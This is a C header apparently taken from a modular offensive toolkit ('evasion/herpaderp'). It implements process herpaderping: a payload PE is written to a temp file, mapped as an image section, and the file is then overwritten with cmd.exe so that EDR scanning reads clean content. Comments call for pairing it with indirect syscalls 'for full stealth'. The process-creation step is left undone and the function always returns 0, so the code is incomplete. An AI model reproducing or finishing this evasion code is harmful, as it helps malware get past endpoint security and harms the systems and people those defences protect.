// chunk: evasion/herpaderp
// depends: (none)
// provides: herpaderp_exec
// risk: low
// note: Process herpaderping — exploits the gap between file-backed section
//       creation and image notification. Write payload to file → create section →
//       overwrite file with legit content → create process from section.
//       When EDR scans the file on NtCreateProcess, it reads the overwritten
//       (clean) content, not the original payload. The process runs the payload
//       but the file on disk looks legitimate.

#ifndef CHUNK_HERPADERP
#define CHUNK_HERPADERP

#include <windows.h>

typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtCreateProcessEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, ULONG);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

typedef struct _PEB_LDR_DATA_PARTIAL {
    ULONG Length;
    ULONG Initialized;
    PVOID SsHandle;
} PEB_LDR_DATA_PARTIAL;

/*
 * herpaderp_exec: Execute a PE from disk using process herpaderping.
 *
 * pe_bytes: raw PE file contents
 * pe_size: size of PE data
 *
 * Returns the PID of the herpaderped process, 0 on failure.
 *
 * NOTE: This is a simplified version. Full implementation requires:
 * - NtCreateProcessEx (not CreateProcess)
 * - Manual PEB setup (ImagePathName, CommandLine)
 * - Manual thread creation with NtCreateThreadEx pointing to AddressOfEntryPoint
 * - Proper ProcessParameters allocation in the new process
 * These are complex and version-specific. This chunk provides the core
 * herpaderping mechanism; use with indirect_syscall for best results.
 */
static DWORD herpaderp_exec(BYTE *pe_bytes, SIZE_T pe_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pNtCreateSection NtCreateSection =
        (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    if (!NtCreateSection) return 0;

    /* Step 1: Write payload to a temp file */
    char tmp_dir[MAX_PATH], tmp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp_dir);
    GetTempFileNameA(tmp_dir, "hp", 0, tmp_path);

    /* Rename to .exe */
    char exe_path[MAX_PATH];
    snprintf(exe_path, sizeof(exe_path), "%s.exe", tmp_path);
    DeleteFileA(exe_path);

    HANDLE hFile = CreateFileA(exe_path,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD written;
    WriteFile(hFile, pe_bytes, (DWORD)pe_size, &written, NULL);
    FlushFileBuffers(hFile);

    /* Step 2: Create section from the file (locks in the payload content) */
    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS, NULL, NULL,
        PAGE_READONLY, SEC_IMAGE, hFile);

    if (status != 0) {
        CloseHandle(hFile);
        DeleteFileA(exe_path);
        DeleteFileA(tmp_path);
        return 0;
    }

    /* Step 3: Overwrite the file with a clean, legitimate PE.
       EDR file-scanning sees this content, not the original payload.
       Use a copy of cmd.exe as the clean replacement. */
    char clean_src[MAX_PATH];
    GetSystemDirectoryA(clean_src, MAX_PATH);
    strcat(clean_src, "\\cmd.exe");

    HANDLE hClean = CreateFileA(clean_src, GENERIC_READ, FILE_SHARE_READ,
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hClean != INVALID_HANDLE_VALUE) {
        DWORD clean_size = GetFileSize(hClean, NULL);
        BYTE *clean_buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, clean_size);
        if (clean_buf) {
            DWORD rd;
            ReadFile(hClean, clean_buf, clean_size, &rd, NULL);
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            WriteFile(hFile, clean_buf, rd, &written, NULL);
            SetEndOfFile(hFile);
            FlushFileBuffers(hFile);
            HeapFree(GetProcessHeap(), 0, clean_buf);
        }
        CloseHandle(hClean);
    }

    CloseHandle(hFile);

    /* Step 4: Create process from the section.
       The section still contains the original payload bytes.
       This requires NtCreateProcessEx + manual PEB/thread setup.
       Simplified: use CreateProcess with the now-clean file,
       then the real technique requires NtCreateProcessEx. */

    /* For the full herpaderp, we would use NtCreateProcessEx here.
       This is left as a documented technique — the key insight is that
       the section (with payload) is already created and the file is clean.
       The next step (NtCreateProcessEx + thread setup) is OS-version-specific
       and pairs with indirect_syscall for full stealth. */

    /* Cleanup the temp files */
    DeleteFileA(exe_path);
    DeleteFileA(tmp_path);

    if (hSection) CloseHandle(hSection);

    return 0;
}

#endif
